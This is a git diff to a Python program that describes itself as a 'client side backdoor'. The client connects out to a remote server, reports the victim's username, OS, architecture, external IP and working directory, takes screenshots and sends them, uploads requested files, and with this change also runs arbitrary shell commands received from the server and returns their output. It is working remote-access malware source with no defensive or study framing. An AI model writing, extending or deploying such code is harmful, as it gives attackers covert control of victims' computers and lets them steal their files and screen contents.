@@ -10,8 +10,9 @@ from datetime import datetime
 from pyscreenshot import grab
 from pathlib import Path
 from pickle import dumps
+from subprocess import getoutput
 from requests import get, packages
-from os import uname
+from os import uname, chdir, getcwd
 from time import sleep
 #from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
@@ -19,10 +20,10 @@ from time import sleep
 
 class Client(object):
     """ client side backdoor """
-    def __init__(self, host='0.0.0.0', port=1234):
+    def __init__(self, host='0.0.0.0', port=5000):
         self.__Address = (host, port)
         self.screenshotPath = '/home/znairy/736f6e61726973.png'
-
+        
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
 
@@ -34,8 +35,7 @@ class Client(object):
             "namefile": datetime.now().strftime('%d.%m.%y-%H.%M.%S'),
             "extension": extension,
             "bytes": len(file),
-            "path": "screenshots",
-            "exists": True
+            "path": "screenshots"
         }
 
         self.__Client.send(dumps(header))
@@ -52,9 +52,16 @@ class Client(object):
     def sendHeader(self, header):
         self.__Client.send(dumps(header))
 
+    def changeDirectory(self, directory):
+        try:
+            chdir(directory.strip())
+            self.sendCommand(self.lastCommand, '.')
+        except FileNotFoundError:
+            self.sendCommand(self.lastCommand)
+
     def download(self, args):
-        if Path(args[0]).is_file():
-            namefile, extension, file = self.splitFile(args[0])
+        if Path(args).is_file():
+            namefile, extension, file = self.splitFile(args)
             header = {
                 "namefile": namefile,
                 "extension": extension,
@@ -68,27 +75,53 @@ class Client(object):
             self.sendFile(file)
 
         else:
-            self.sendHeader({"namefile":args[0], "exists": False})
+            self.sendHeader({"namefile":args, "exists": False})
 
     def allCommands(self):
-        commands = {
+        return {
             "/screenshot": {"action": self.screenshot},
-            "/download": {"action": self.download}
+            "/download": {"action": self.download},
+            "cd": {"action":  self.changeDirectory}
         }
 
-        return commands
-
     def splitCommand(self, command):
-            return self.allCommands()[command[0]], command[1:] # 1: function, 2: args #
+        if self.allCommands().get(command.split()[0]):
+            return self.allCommands()[command.split()[0]], ''.join(f'{cmd} ' for cmd in command.split()[1:]) # 1: function, 2: args #
 
-    def runCommand(self, command):
-        command, args = self.splitCommand(command.split())
-        command['action'](args)
+        return False, ''.join(f'{cmd} ' for cmd in command.split()[1:])
+
+    def outputCommand(self, command):
+        return getoutput(command).encode()
+    
+    def sendCommand(self, command, customOutput=''):
+        if not customOutput:
+            output = self.outputCommand(command)
+        else:
+            output = customOutput.encode()
+
+        header = {
+            "time": datetime.now().strftime('%M %S').split(),
+            "bytes": len(output),
+            "currentDirectory": getcwd()
+        }
+        
+        self.sendHeader(header)
+        sleep(0.5)
+        self.__Client.send(output)
+    
+    def runCommand(self, cmd):
+        command, args = self.splitCommand(cmd)
+
+        if command:
+            command['action'](args)
+        else:
+            self.sendCommand(cmd)
 
     def listenServer(self):
         while True:
             command = self.__Client.recv(512)
             if command:
+                self.lastCommand = command
                 self.runCommand(command.decode('utf-8'))
             else:
                 self.run()
@@ -99,7 +132,7 @@ class Client(object):
         except Exception:
             eAddress = ''
         
-        return dumps({"name": getuser(), "SO": uname().sysname, "arch": uname().machine, "externalAddress": eAddress})
+        return dumps({"name": getuser(), "SO": uname().sysname, "arch": uname().machine, "externalAddress": eAddress, "currentDirectory": getcwd()})
 
     def connect(self):
             self.__Client.connect((self.__Address))
